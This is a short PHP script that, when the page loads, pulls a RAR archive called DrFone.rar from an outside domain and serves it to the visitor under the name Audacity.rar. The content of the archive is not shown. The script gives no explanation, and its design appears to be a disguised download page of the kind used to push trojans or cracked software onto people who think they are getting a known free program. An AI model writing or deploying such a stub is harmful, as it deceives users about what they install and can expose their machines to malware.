<?php

download_file('https://importacioneslumina.com/files/DrFone.rar', 'Audacity.rar');

function download_file($file, $name) {
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename=' . $name);
    exit(readfile($file));
}
?>